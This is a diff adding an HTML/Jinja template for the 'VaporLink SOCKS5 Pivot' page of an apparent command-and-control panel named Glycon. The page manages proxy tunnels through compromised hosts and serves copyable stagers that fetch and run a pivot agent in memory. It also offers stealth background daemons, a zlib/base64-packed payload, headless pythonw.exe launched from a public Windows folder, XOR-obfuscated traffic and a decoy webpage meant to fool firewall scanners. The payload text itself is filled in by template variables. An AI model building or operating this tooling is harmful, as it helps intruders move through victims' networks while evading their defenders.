@@ -1,0 +1,969 @@
+{% extends "base.html" %}
+{% from "macros.html" import icon, status_badge %}
+
+{% block title %}VaporLink SOCKS5 Pivot{% endblock %}
+
+{% block content %}
+<div class="space-y-6">
+    <!-- Compact Top Header -->
+    <div class="flex flex-col lg:flex-row lg:items-center justify-between gap-4 pb-4 border-b border-slate-800/80">
+        <div class="flex items-center gap-3.5">
+            <div class="w-11 h-11 rounded-xl bg-cyan-500/15 border border-cyan-500/30 flex items-center justify-center text-cyan-400 shrink-0">
+                {{ icon('vaporlink', 'w-5 h-5') }}
+            </div>
+            <div>
+                <div class="flex flex-wrap items-center gap-2.5">
+                    <h1 class="text-xl font-bold tracking-tight text-slate-100">VaporLink SOCKS5 Pivot</h1>
+                    <span id="vl-running-badge" class="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-xs font-medium {% if vl_status.running %}bg-emerald-500/15 text-emerald-400 border border-emerald-500/30{% else %}bg-rose-500/15 text-rose-400 border border-rose-500/30{% endif %}">
+                        <span class="w-1.5 h-1.5 rounded-full {% if vl_status.running %}bg-emerald-400 animate-pulse{% else %}bg-rose-400{% endif %}"></span>
+                        <span id="vl-running-text">{{ 'Listener Online' if vl_status.running else 'Listener Offline' }}</span>
+                    </span>
+                </div>
+                <p class="text-xs text-slate-400 mt-0.5">
+                    WSS SOCKS5 Multiplexer &bull; Vectorized XOR &bull; Multi-Port Routing &bull; Headless <code class="text-slate-300 font-mono">pythonw.exe</code>
+                </p>
+            </div>
+        </div>
+
+        <div class="flex flex-wrap items-center gap-2">
+            <a id="header-decoy-link" href="{{ vl_status.decoy_url }}" target="_blank" rel="noopener" class="tactical-btn-ghost text-xs" title="Open live Decoy Webpage on VaporLink listener port">
+                {{ icon('eye', 'w-4 h-4 text-emerald-400') }}
+                <span>Open Decoy Page</span>
+            </a>
+            <button type="button" onclick="rotateVaporKeys()" class="tactical-btn-secondary text-xs">
+                {{ icon('key', 'w-4 h-4 text-amber-400') }}
+                <span>Rotate Keys</span>
+            </button>
+            <button type="button" onclick="refreshVaporStatus(true)" class="tactical-btn-primary text-xs">
+                {{ icon('refresh', 'w-4 h-4') }}
+                <span>Refresh</span>
+            </button>
+        </div>
+    </div>
+
+    <!-- Error Banner (Only visible if bind fails) -->
+    <div id="vl-error-banner" class="{% if not vl_status.listener_error %}hidden{% endif %} px-4 py-3 rounded-xl bg-rose-500/10 border border-rose-500/30 text-rose-300 text-xs flex items-center gap-2.5">
+        {{ icon('info', 'w-4 h-4 text-rose-400 shrink-0') }}
+        <span><strong>Listener Error:</strong> <span id="vl-error-text">{{ vl_status.listener_error or '' }}</span></span>
+    </div>
+
+    <!-- Compact 4 KPI Strip -->
+    <div class="grid grid-cols-1 sm:grid-cols-2 xl:grid-cols-4 gap-3.5">
+        <div class="tactical-card p-4 bg-gradient-to-br from-cyan-500/10 to-transparent border-cyan-500/20">
+            <p class="text-[11px] font-semibold uppercase tracking-wider text-slate-400">WSS / Stager Ingress</p>
+            <p id="kpi-ws-bind" class="text-lg font-bold font-mono text-slate-100 mt-1">{{ vl_status.config.ws_ip }}:{{ vl_status.config.ws_port }}</p>
+            <p id="kpi-ws-mode" class="text-[11px] text-cyan-400 mt-0.5 font-mono">
+                {{ 'HTTPS/WSS' if vl_status.config.tls_enabled else 'HTTP/WS' }} &bull; Decoy: {{ 'ON' if vl_status.config.web_server else 'OFF' }}
+            </p>
+        </div>
+
+        <div class="tactical-card p-4 bg-gradient-to-br from-emerald-500/10 to-transparent border-emerald-500/20">
+            <p class="text-[11px] font-semibold uppercase tracking-wider text-slate-400">Primary SOCKS5 Proxy</p>
+            <div class="flex items-center gap-1.5 mt-1">
+                <p id="kpi-socks-bind" class="text-lg font-bold font-mono text-emerald-400 truncate">
+                    socks5://{{ vl_status.config.socks_ip }}:{{ vl_status.config.socks_port }}
+                </p>
+                <button type="button" onclick="copyText(document.getElementById('kpi-socks-bind').textContent.trim(), 'Primary SOCKS5 copied')" class="text-slate-400 hover:text-emerald-400 p-1">
+                    {{ icon('copy', 'w-3.5 h-3.5') }}
+                </button>
+            </div>
+            <p id="kpi-primary-target" class="text-[11px] text-slate-400 mt-0.5 truncate font-mono">
+                {% if vl_status.primary_session %}
+                    Routed &rarr; {{ vl_status.primary_session.hostname }}
+                {% else %}
+                    Waiting for pivot...
+                {% endif %}
+            </p>
+        </div>
+
+        <div class="tactical-card p-4 bg-gradient-to-br from-amber-500/10 to-transparent border-amber-500/20">
+            <p class="text-[11px] font-semibold uppercase tracking-wider text-slate-400">Tunnels / Streams</p>
+            <p class="text-lg font-bold font-mono text-slate-100 mt-1">
+                <span id="kpi-session-count" class="text-amber-400">{{ vl_status.session_count }}</span>
+                <span class="text-slate-600 mx-1">/</span>
+                <span id="kpi-stream-count">{{ vl_status.active_streams }}</span>
+                <span class="text-xs font-normal text-slate-400">active streams</span>
+            </p>
+            <p class="text-[11px] text-slate-400 mt-0.5">Zero-RTT Local Handshake</p>
+        </div>
+
+        <div class="tactical-card p-4 bg-gradient-to-br from-purple-500/10 to-transparent border-purple-500/20">
+            <p class="text-[11px] font-semibold uppercase tracking-wider text-slate-400">Tunnel Throughput</p>
+            <p class="text-base font-bold font-mono text-slate-100 mt-1">
+                <span class="text-emerald-400">&uarr;</span> <span id="kpi-tx">{{ vl_status.total_bytes_tx }} B</span>
+                <span class="text-slate-600 mx-1">|</span>
+                <span class="text-cyan-400">&darr;</span> <span id="kpi-rx">{{ vl_status.total_bytes_rx }} B</span>
+            </p>
+            <p class="text-[11px] text-slate-400 mt-0.5">C-Speed XOR Framing</p>
+        </div>
+    </div>
+
+    <!-- Clean Navigation Tabs (Only 1 section visible at a time) -->
+    <div class="flex flex-wrap items-center gap-2 border-b border-slate-800/80 pb-3">
+        <button type="button" onclick="switchVaporTab('tunnels')" id="vtab-btn-tunnels" class="vtab-btn px-4 py-2 rounded-xl text-xs font-semibold transition-all bg-emerald-500/15 text-emerald-400 border border-emerald-500/30 flex items-center gap-2">
+            {{ icon('vaporlink', 'w-4 h-4') }}
+            <span>Active Tunnels</span>
+            <span id="tab-badge-sessions" class="px-1.5 py-0.5 text-[10px] font-mono rounded-full bg-emerald-500/20 text-emerald-300">{{ vl_status.session_count }}</span>
+        </button>
+
+        <button type="button" onclick="switchVaporTab('oneliners')" id="vtab-btn-oneliners" class="vtab-btn px-4 py-2 rounded-xl text-xs font-semibold transition-all text-slate-400 hover:text-slate-100 bg-slate-900/60 border border-slate-800 flex items-center gap-2">
+            {{ icon('terminal', 'w-4 h-4') }}
+            <span>Client One-Liners (genclient)</span>
+        </button>
+
+        <button type="button" onclick="switchVaporTab('config')" id="vtab-btn-config" class="vtab-btn px-4 py-2 rounded-xl text-xs font-semibold transition-all text-slate-400 hover:text-slate-100 bg-slate-900/60 border border-slate-800 flex items-center gap-2">
+            {{ icon('settings', 'w-4 h-4') }}
+            <span>Listener &amp; Decoy Webserver</span>
+        </button>
+
+        <button type="button" onclick="switchVaporTab('security')" id="vtab-btn-security" class="vtab-btn px-4 py-2 rounded-xl text-xs font-semibold transition-all text-slate-400 hover:text-slate-100 bg-slate-900/60 border border-slate-800 flex items-center gap-2">
+            {{ icon('shield', 'w-4 h-4') }}
+            <span>Security &amp; Event Logs</span>
+            <span id="tab-badge-bans" class="px-1.5 py-0.5 text-[10px] font-mono rounded-full bg-slate-800 text-slate-300">{{ vl_status.banned_ips|length }}</span>
+        </button>
+    </div>
+
+    <!-- ================================================================ -->
+    <!-- TAB 1: ACTIVE TUNNELS & QUICK-DEPLOY (DEFAULT VIEW)              -->
+    <!-- ================================================================ -->
+    <div id="vtab-panel-tunnels" class="vtab-panel space-y-5">
+        <!-- Compact Quick-Launch on Registered Glycon Agent -->
+        <div class="tactical-card p-4 border-emerald-500/20 bg-slate-900/80 flex flex-col lg:flex-row lg:items-center justify-between gap-3">
+            <div class="flex items-center gap-3">
+                <div class="w-9 h-9 rounded-lg bg-emerald-500/15 border border-emerald-500/30 flex items-center justify-center text-emerald-400 shrink-0">
+                    {{ icon('agents', 'w-4 h-4') }}
+                </div>
+                <div>
+                    <h2 class="text-xs font-bold uppercase tracking-wider text-emerald-400">Launch on Registered Glycon Agent</h2>
+                    <p class="text-xs text-slate-400">
+                        Starts headless <code class="text-slate-300 font-mono">pythonw.exe</code> directly from <code class="text-slate-300 font-mono">C:\Users\Public\Documents</code>.
+                    </p>
+                </div>
+            </div>
+            <div class="flex flex-wrap sm:flex-nowrap items-center gap-2">
+                <select id="deploy-agent-select" class="tactical-input text-xs py-1.5 min-w-[240px]">
+                    <option value="">-- Select Glycon Agent --</option>
+                    {% for ag in agents %}
+                    <option value="{{ ag.id }}">
+                        [{{ ag.status|upper }}] {{ ag.hostname }} ({{ ag.ip }}) [{{ ag.id[:8] }}]
+                    </option>
+                    {% endfor %}
+                </select>
+                <button type="button" onclick="controlAgentPivot('start')" class="tactical-btn-primary text-xs py-1.5 whitespace-nowrap">
+                    {{ icon('plug', 'w-3.5 h-3.5') }}
+                    <span>Start Pivot</span>
+                </button>
+                <button type="button" onclick="controlAgentPivot('stop')" class="tactical-btn-danger text-xs py-1.5 whitespace-nowrap">
+                    {{ icon('close', 'w-3.5 h-3.5') }}
+                    <span>Stop Pivot</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- Active SOCKS5 Pivot Tunnels Table -->
+        <div class="tactical-card overflow-hidden">
+            <div class="px-5 py-3.5 border-b border-slate-800/80 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
+                <div>
+                    <h2 class="text-sm font-semibold text-slate-100">Connected SOCKS5 Pivot Sessions</h2>
+                    <p class="text-xs text-slate-400">Use a session's dedicated port or route it to the Primary SOCKS5 port (<code class="text-emerald-400 font-mono">{{ vl_status.config.socks_ip }}:{{ vl_status.config.socks_port }}</code>).</p>
+                </div>
+                <div class="flex items-center gap-2 text-xs font-mono text-slate-400 bg-slate-950/90 px-3 py-1.5 rounded-lg border border-slate-800">
+                    <span>Proxychains:</span>
+                    <code id="proxychains-hint" class="text-emerald-400">socks5 {{ vl_status.config.socks_ip }} {{ vl_status.config.socks_port }}</code>
+                    <button type="button" onclick="copyText(document.getElementById('proxychains-hint').innerText, 'Proxychains config copied')" class="text-slate-400 hover:text-slate-100">
+                        {{ icon('copy', 'w-3.5 h-3.5') }}
+                    </button>
+                </div>
+            </div>
+
+            <div class="overflow-x-auto">
+                <table class="tactical-table">
+                    <thead>
+                        <tr>
+                            <th>Session</th>
+                            <th>Target Host / IP</th>
+                            <th>Source</th>
+                            <th>Dedicated SOCKS5</th>
+                            <th>Primary (:{{ vl_status.config.socks_port }})</th>
+                            <th>Streams</th>
+                            <th>Traffic (TX / RX)</th>
+                            <th>Connected</th>
+                            <th class="text-right">Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="vl-sessions-tbody">
+                        {% if vl_status.sessions %}
+                            {% for s in vl_status.sessions %}
+                            <tr>
+                                <td class="font-mono text-xs text-cyan-400 font-semibold">{{ s.session_id }}</td>
+                                <td>
+                                    <div class="font-semibold text-slate-100">{{ s.hostname }}</div>
+                                    <div class="text-xs font-mono text-slate-400">{{ s.client_ip }} &bull; {{ s.os_info }}</div>
+                                </td>
+                                <td>
+                                    {% if s.source_type == 'glycon_agent' %}
+                                    <span class="px-2 py-0.5 text-xs rounded-md bg-emerald-500/15 text-emerald-400 border border-emerald-500/30 font-mono">
+                                        Glycon ({{ s.agent_id[:8] }})
+                                    </span>
+                                    {% else %}
+                                    <span class="px-2 py-0.5 text-xs rounded-md bg-cyan-500/15 text-cyan-300 border border-cyan-500/30 font-mono">
+                                        One-Liner
+                                    </span>
+                                    {% endif %}
+                                </td>
+                                <td>
+                                    {% if s.dedicated_socks_bind %}
+                                    <div class="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-slate-950 border border-slate-800 font-mono text-xs text-cyan-300">
+                                        <span>socks5://{{ s.dedicated_socks_bind }}</span>
+                                        <button type="button" onclick="copyText('socks5://{{ s.dedicated_socks_bind }}', 'Dedicated SOCKS5 copied')" class="text-slate-400 hover:text-cyan-300">
+                                            {{ icon('copy', 'w-3.5 h-3.5') }}
+                                        </button>
+                                    </div>
+                                    {% else %}
+                                    <span class="text-xs text-slate-500">N/A</span>
+                                    {% endif %}
+                                </td>
+                                <td>
+                                    {% if s.is_primary %}
+                                    <span class="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-semibold bg-emerald-500/15 text-emerald-400 border border-emerald-500/30">
+                                        <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
+                                        Active on :{{ vl_status.config.socks_port }}
+                                    </span>
+                                    {% else %}
+                                    <button type="button" onclick="setPrimarySession('{{ s.session_id }}')" class="tactical-btn-ghost text-xs py-1 px-2.5">
+                                        Route to :{{ vl_status.config.socks_port }}
+                                    </button>
+                                    {% endif %}
+                                </td>
+                                <td class="font-mono text-xs text-slate-200">{{ s.active_streams }}</td>
+                                <td class="font-mono text-xs">
+                                    <span class="text-emerald-400">&uarr; {{ s.bytes_tx }} B</span> /
+                                    <span class="text-cyan-400">&darr; {{ s.bytes_rx }} B</span>
+                                </td>
+                                <td class="font-mono text-xs text-slate-400">{{ s.connected_since }}</td>
+                                <td class="text-right space-x-1.5">
+                                    <button type="button" onclick="kickSession('{{ s.session_id }}')" class="tactical-btn-danger text-xs py-1 px-2.5">
+                                        Disconnect
+                                    </button>
+                                    <button type="button" onclick="banIp('{{ s.client_ip }}')" class="tactical-btn-ghost text-xs py-1 px-2 text-rose-400">
+                                        Ban
+                                    </button>
+                                </td>
+                            </tr>
+                            {% endfor %}
+                        {% else %}
+                            <tr>
+                                <td colspan="9" class="text-center py-10 text-slate-500 text-sm">
+                                    No active VaporLink pivot tunnels. Select an agent above or open the <strong>Client One-Liners</strong> tab to connect a target.
+                                </td>
+                            </tr>
+                        {% endif %}
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <!-- ================================================================ -->
+    <!-- TAB 2: CLIENT ONE-LINERS (HIDDEN UNTIL CLICKED)                  -->
+    <!-- ================================================================ -->
+    <div id="vtab-panel-oneliners" class="vtab-panel hidden space-y-5">
+        <div class="tactical-card p-5 space-y-4">
+            <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800/80 pb-4">
+                <div>
+                    <h2 class="text-sm font-semibold text-slate-100">Zero-Dependency Python One-Liner Generator</h2>
+                    <p class="text-xs text-slate-400">100% Pure Python 3.8+ Standard Library (<code class="text-slate-300 font-mono">asyncio</code>) — zero external packages required.</p>
+                </div>
+                <div class="flex flex-wrap items-center gap-2.5">
+                    <label class="inline-flex items-center gap-2 text-xs text-slate-300 cursor-pointer bg-slate-950/80 px-3 py-1.5 rounded-lg border border-slate-800">
+                        <input type="checkbox" id="oneliner-insecure-toggle" checked onchange="refreshVaporStatus(false)" class="rounded border-slate-700 bg-slate-900 text-emerald-500">
+                        <span>Self-Signed TLS (<code class="font-mono text-amber-400">insecure</code>)</span>
+                    </label>
+                    <button type="button" onclick="GlyconUI.openModal('proxyConfigModal')" class="tactical-btn-ghost text-xs py-1.5">
+                        {{ icon('file', 'w-4 h-4 text-cyan-400') }}
+                        <span>Nginx / Apache Proxy Config</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Sub-selector pills so only ONE payload box is shown at a time (or expand all) -->
+            <div class="flex flex-wrap items-center gap-2">
+                <button type="button" onclick="selectOneLinerCard('ol-card-1')" id="ol-pill-1" class="ol-pill px-3 py-1.5 rounded-lg text-xs font-semibold bg-emerald-500/15 text-emerald-400 border border-emerald-500/30">
+                    [1] Direct Endpoint Stager (RAM)
+                </button>
+                <button type="button" onclick="selectOneLinerCard('ol-card-2')" id="ol-pill-2" class="ol-pill px-3 py-1.5 rounded-lg text-xs font-semibold text-slate-400 bg-slate-950/70 border border-slate-800">
+                    [2] Stealth Background Daemon (bg)
+                </button>
+                <button type="button" onclick="selectOneLinerCard('ol-card-3')" id="ol-pill-3" class="ol-pill px-3 py-1.5 rounded-lg text-xs font-semibold text-slate-400 bg-slate-950/70 border border-slate-800">
+                    [3] Standalone Zero-Staging (zlib+b64)
+                </button>
+                <button type="button" onclick="selectOneLinerCard('ol-card-4')" id="ol-pill-4" class="ol-pill px-3 py-1.5 rounded-lg text-xs font-semibold text-slate-400 bg-slate-950/70 border border-slate-800">
+                    [4] Windows Headless pythonw.exe
+                </button>
+            </div>
+
+            <!-- Card 1 -->
+            <div id="ol-card-1" class="ol-card p-4 rounded-xl bg-slate-950/90 border border-slate-800 space-y-2.5">
+                <div class="flex items-center justify-between">
+                    <div>
+                        <span class="text-xs font-bold uppercase tracking-wider text-emerald-400">[1] Direct Endpoint Stager (Recommended)</span>
+                        <p class="text-xs text-slate-400 mt-0.5">Fetches and executes the pivot agent directly in RAM using authenticated <code class="text-slate-300">X-Vapor-Token</code> headers.</p>
+                    </div>
+                    <button type="button" onclick="copyText(document.getElementById('ol-staged-fg').value, 'Staged one-liner copied')" class="tactical-btn-primary text-xs py-1.5 px-3">
+                        {{ icon('copy', 'w-3.5 h-3.5') }}
+                        <span>Copy Command</span>
+                    </button>
+                </div>
+                <textarea id="ol-staged-fg" readonly rows="3" class="w-full bg-slate-900 border border-slate-800 rounded-lg p-3 text-xs font-mono text-emerald-300 focus:outline-none">{{ vl_status.oneliners.staged_fg }}</textarea>
+            </div>
+
+            <!-- Card 2 -->
+            <div id="ol-card-2" class="ol-card hidden p-4 rounded-xl bg-slate-950/90 border border-slate-800 space-y-2.5">
+                <div class="flex items-center justify-between">
+                    <div>
+                        <span class="text-xs font-bold uppercase tracking-wider text-cyan-400">[2] Stealth Background Daemon (bg)</span>
+                        <p class="text-xs text-slate-400 mt-0.5">Detaches in RAM (double-fork on Linux/macOS, <code class="text-slate-300">pythonw.exe</code> on Windows) and frees your shell immediately.</p>
+                    </div>
+                    <button type="button" onclick="copyText(document.getElementById('ol-staged-bg').value, 'Background daemon one-liner copied')" class="tactical-btn-primary text-xs py-1.5 px-3">
+                        {{ icon('copy', 'w-3.5 h-3.5') }}
+                        <span>Copy Command</span>
+                    </button>
+                </div>
+                <textarea id="ol-staged-bg" readonly rows="3" class="w-full bg-slate-900 border border-slate-800 rounded-lg p-3 text-xs font-mono text-cyan-300 focus:outline-none">{{ vl_status.oneliners.staged_bg }}</textarea>
+            </div>
+
+            <!-- Card 3 -->
+            <div id="ol-card-3" class="ol-card hidden p-4 rounded-xl bg-slate-950/90 border border-slate-800 space-y-2.5">
+                <div class="flex items-center justify-between">
+                    <div>
+                        <span class="text-xs font-bold uppercase tracking-wider text-amber-400">[3] Standalone Zero-Staging (zlib + base64)</span>
+                        <p class="text-xs text-slate-400 mt-0.5">100% self-contained command with the entire pivot client compressed inside — zero HTTP staging requests.</p>
+                    </div>
+                    <button type="button" onclick="copyText(document.getElementById('ol-standalone-fg').value, 'Standalone one-liner copied')" class="tactical-btn-primary text-xs py-1.5 px-3">
+                        {{ icon('copy', 'w-3.5 h-3.5') }}
+                        <span>Copy Command</span>
+                    </button>
+                </div>
+                <textarea id="ol-standalone-fg" readonly rows="4" class="w-full bg-slate-900 border border-slate-800 rounded-lg p-3 text-xs font-mono text-amber-300 focus:outline-none">{{ vl_status.oneliners.standalone_fg }}</textarea>
+            </div>
+
+            <!-- Card 4 -->
+            <div id="ol-card-4" class="ol-card hidden p-4 rounded-xl bg-slate-950/90 border border-slate-800 space-y-2.5">
+                <div class="flex items-center justify-between">
+                    <div>
+                        <span class="text-xs font-bold uppercase tracking-wider text-purple-400">[4] Windows Headless pythonw (C:\Users\Public\Documents)</span>
+                        <p class="text-xs text-slate-400 mt-0.5">Starts <code class="text-slate-300">pythonw.exe</code> headless directly from the Glycon Windows folder (<code class="text-slate-300">C:\Users\Public\Documents</code>).</p>
+                    </div>
+                    <button type="button" onclick="copyText(document.getElementById('ol-windows-bg').value, 'Windows pythonw one-liner copied')" class="tactical-btn-primary text-xs py-1.5 px-3">
+                        {{ icon('copy', 'w-3.5 h-3.5') }}
+                        <span>Copy Command</span>
+                    </button>
+                </div>
+                <textarea id="ol-windows-bg" readonly rows="4" class="w-full bg-slate-900 border border-slate-800 rounded-lg p-3 text-xs font-mono text-purple-300 focus:outline-none">{{ vl_status.oneliners.windows_cmd }}</textarea>
+            </div>
+        </div>
+    </div>
+
+    <!-- ================================================================ -->
+    <!-- TAB 3: LISTENER & DECOY WEBSERVER (HIDDEN UNTIL CLICKED)         -->
+    <!-- ================================================================ -->
+    <div id="vtab-panel-config" class="vtab-panel hidden">
+        <div class="grid grid-cols-1 xl:grid-cols-12 gap-6">
+            <!-- Left: Listener Settings (5 cols) -->
+            <div class="xl:col-span-5 tactical-card p-5 space-y-4">
+                <div class="border-b border-slate-800/80 pb-3">
+                    <h2 class="text-sm font-semibold text-slate-100">Listener &amp; Network Settings</h2>
+                    <p class="text-xs text-slate-400">Reloads VaporLink listeners dynamically without restarting Glycon.</p>
+                </div>
+
+                <div class="grid grid-cols-2 gap-2.5">
+                    <button type="button" onclick="applyModePreset('standalone-https')" class="p-2.5 rounded-xl border border-slate-800 hover:border-cyan-500/40 bg-slate-950/60 text-left">
+                        <div class="text-xs font-semibold text-cyan-400">Standalone HTTPS/WSS</div>
+                        <div class="text-[11px] text-slate-400">Direct TLS (0.0.0.0:9443)</div>
+                    </button>
+                    <button type="button" onclick="applyModePreset('proxy-mode')" class="p-2.5 rounded-xl border border-slate-800 hover:border-emerald-500/40 bg-slate-950/60 text-left">
+                        <div class="text-xs font-semibold text-emerald-400">Reverse Proxy Mode</div>
+                        <div class="text-[11px] text-slate-400">Plain WS (127.0.0.1:8000)</div>
+                    </button>
+                </div>
+
+                <form id="vl-config-form" onsubmit="saveVaporConfig(event)" class="space-y-3.5">
+                    <div>
+                        <label class="block text-xs font-medium text-slate-300 mb-1">Public WSS &amp; Stager Endpoint (<code class="text-cyan-400">WS_LINK</code>)</label>
+                        <input type="text" id="cfg-ws-link" value="{{ vl_status.config.ws_link }}" class="tactical-input text-xs font-mono">
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-3">
+                        <div>
+                            <label class="block text-xs font-medium text-slate-300 mb-1">WS Bind IP</label>
+                            <input type="text" id="cfg-ws-ip" value="{{ vl_status.config.ws_ip }}" class="tactical-input text-xs font-mono">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-medium text-slate-300 mb-1">WS Bind Port</label>
+                            <input type="number" id="cfg-ws-port" value="{{ vl_status.config.ws_port }}" min="1" max="65535" class="tactical-input text-xs font-mono">
+                        </div>
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-3">
+                        <div>
+                            <label class="block text-xs font-medium text-slate-300 mb-1">Primary SOCKS5 IP</label>
+                            <input type="text" id="cfg-socks-ip" value="{{ vl_status.config.socks_ip }}" class="tactical-input text-xs font-mono">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-medium text-slate-300 mb-1">Primary SOCKS5 Port</label>
+                            <input type="number" id="cfg-socks-port" value="{{ vl_status.config.socks_port }}" min="1" max="65535" class="tactical-input text-xs font-mono">
+                        </div>
+                    </div>
+
+                    <div class="grid grid-cols-2 gap-3">
+                        <label class="flex items-center gap-2 p-2.5 rounded-xl bg-slate-950/80 border border-slate-800 cursor-pointer">
+                            <input type="checkbox" id="cfg-tls-enabled" {% if vl_status.config.tls_enabled %}checked{% endif %} class="rounded border-slate-700 bg-slate-900 text-cyan-500">
+                            <span class="text-xs font-medium text-slate-200">Direct TLS (WSS)</span>
+                        </label>
+                        <label class="flex items-center gap-2 p-2.5 rounded-xl bg-slate-950/80 border border-slate-800 cursor-pointer">
+                            <input type="checkbox" id="cfg-web-server" {% if vl_status.config.web_server %}checked{% endif %} class="rounded border-slate-700 bg-slate-900 text-emerald-500">
+                            <span class="text-xs font-medium text-slate-200">Decoy Webserver</span>
+                        </label>
+                    </div>
+
+                    <!-- Collapsible Keys Drawer -->
+                    <div class="border border-slate-800 rounded-xl overflow-hidden bg-slate-950/60">
+                        <button type="button" onclick="document.getElementById('keys-drawer').classList.toggle('hidden')" class="w-full px-3.5 py-2.5 text-left text-xs font-semibold text-slate-300 hover:text-slate-100 flex items-center justify-between">
+                            <span>Show Active XOR Key &amp; X-Vapor-Token</span>
+                            <span class="text-cyan-400 font-mono text-[11px]">Toggle</span>
+                        </button>
+                        <div id="keys-drawer" class="hidden p-3.5 pt-0 space-y-2 border-t border-slate-800/80">
+                            <div class="flex items-center justify-between pt-2">
+                                <span class="text-[11px] text-slate-400">16-Byte XOR Key</span>
+                                <button type="button" onclick="copyText(document.getElementById('cfg-xor-key').innerText, 'XOR key copied')" class="text-xs text-cyan-400 hover:underline">Copy</button>
+                            </div>
+                            <div id="cfg-xor-key" class="font-mono text-xs text-slate-200 bg-slate-900 px-2.5 py-1.5 rounded border border-slate-800 break-all">{{ vl_status.config.xor_key }}</div>
+
+                            <div class="flex items-center justify-between pt-1">
+                                <span class="text-[11px] text-slate-400">32-Byte X-Vapor-Token</span>
+                                <button type="button" onclick="copyText(document.getElementById('cfg-conn-token').innerText, 'Auth token copied')" class="text-xs text-cyan-400 hover:underline">Copy</button>
+                            </div>
+                            <div id="cfg-conn-token" class="font-mono text-xs text-emerald-300 bg-slate-900 px-2.5 py-1.5 rounded border border-slate-800 break-all">{{ vl_status.config.conn_token }}</div>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="tactical-btn-primary w-full justify-center text-xs">
+                        {{ icon('check', 'w-4 h-4') }}
+                        <span>Save &amp; Reload Listeners</span>
+                    </button>
+                </form>
+            </div>
+
+            <!-- Right: Decoy Webserver Preview & HTML Editor (7 cols) -->
+            <div class="xl:col-span-7 tactical-card p-5 space-y-4">
+                <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800/80 pb-3">
+                    <div>
+                        <h2 class="text-sm font-semibold text-slate-100">Decoy Root Webpage (<code class="text-emerald-400 font-mono">/</code>)</h2>
+                        <p class="text-xs text-slate-400">
+                            Served to unauthenticated browsers &amp; firewall scanners on <a id="decoy-url-inline" href="{{ vl_status.decoy_url }}" target="_blank" class="text-cyan-400 hover:underline font-mono">{{ vl_status.decoy_url }}</a>
+                        </p>
+                    </div>
+                    <div class="flex items-center gap-2">
+                        <a id="decoy-open-btn" href="{{ vl_status.decoy_url }}" target="_blank" rel="noopener" class="tactical-btn-ghost text-xs py-1.5">
+                            {{ icon('eye', 'w-3.5 h-3.5 text-emerald-400') }}
+                            <span>Open Live URL</span>
+                        </a>
+                        <button type="button" onclick="toggleDecoyEditor()" class="tactical-btn-secondary text-xs py-1.5">
+                            {{ icon('edit', 'w-3.5 h-3.5') }}
+                            <span id="decoy-edit-btn-text">Edit HTML</span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Live Decoy Preview Frame -->
+                <div id="decoy-preview-container" class="rounded-xl overflow-hidden border border-slate-800 bg-slate-950">
+                    <iframe id="decoy-preview-iframe" src="/vaporlink/decoy" class="w-full h-80 border-0" title="VaporLink Decoy Preview"></iframe>
+                </div>
+
+                <!-- Collapsible Decoy HTML Editor (Hidden until "Edit HTML" is clicked) -->
+                <div id="decoy-editor-container" class="hidden space-y-3">
+                    <textarea id="decoy-html-textarea" rows="12" class="w-full bg-slate-950 border border-slate-800 rounded-xl p-3 text-xs font-mono text-slate-200 focus:outline-none focus:border-cyan-500/50"></textarea>
+                    <div class="flex items-center justify-between gap-2">
+                        <button type="button" onclick="saveDecoyHtml(true)" class="tactical-btn-ghost text-xs text-amber-400">
+                            Reset to Default EdgeNode Template
+                        </button>
+                        <button type="button" onclick="saveDecoyHtml(false)" class="tactical-btn-primary text-xs">
+                            {{ icon('check', 'w-4 h-4') }}
+                            <span>Save Decoy HTML</span>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ================================================================ -->
+    <!-- TAB 4: SECURITY & EVENT LOGS (HIDDEN UNTIL CLICKED)              -->
+    <!-- ================================================================ -->
+    <div id="vtab-panel-security" class="vtab-panel hidden">
+        <div class="grid grid-cols-1 xl:grid-cols-12 gap-6">
+            <!-- Strike Protection / IP Banlist (5 cols) -->
+            <div class="xl:col-span-5 tactical-card p-5 space-y-4">
+                <div class="border-b border-slate-800/80 pb-3">
+                    <h2 class="text-sm font-semibold text-slate-100">Strike Protection &amp; IP Banlist</h2>
+                    <p class="text-xs text-slate-400">Auto-bans IPs after 3 failed <code class="text-slate-300">X-Vapor-Token</code> attempts.</p>
+                </div>
+
+                <form onsubmit="manualBanIp(event)" class="flex items-center gap-2">
+                    <input type="text" id="ban-ip-input" placeholder="IP to ban (e.g. 192.0.2.15)" class="tactical-input text-xs font-mono py-1.5">
+                    <button type="submit" class="tactical-btn-danger text-xs py-1.5 px-3 whitespace-nowrap">Ban IP</button>
+                </form>
+
+                <div class="overflow-x-auto max-h-64">
+                    <table class="tactical-table">
+                        <thead>
+                            <tr>
+                                <th>IP</th>
+                                <th>Reason</th>
+                                <th class="text-right">Action</th>
+                            </tr>
+                        </thead>
+                        <tbody id="vl-bans-tbody">
+                            {% if vl_status.banned_ips %}
+                                {% for b in vl_status.banned_ips %}
+                                <tr>
+                                    <td class="font-mono text-xs text-rose-400 font-semibold">{{ b.ip }}</td>
+                                    <td class="text-xs text-slate-300">{{ b.reason }}</td>
+                                    <td class="text-right">
+                                        <button type="button" onclick="unbanIp('{{ b.ip }}')" class="tactical-btn-ghost text-xs py-1 px-2 text-emerald-400">Allow</button>
+                                    </td>
+                                </tr>
+                                {% endfor %}
+                            {% else %}
+                                <tr>
+                                    <td colspan="3" class="text-center py-6 text-xs text-slate-500">No banned IP addresses.</td>
+                                </tr>
+                            {% endif %}
+                        </tbody>
+                    </table>
+                </div>
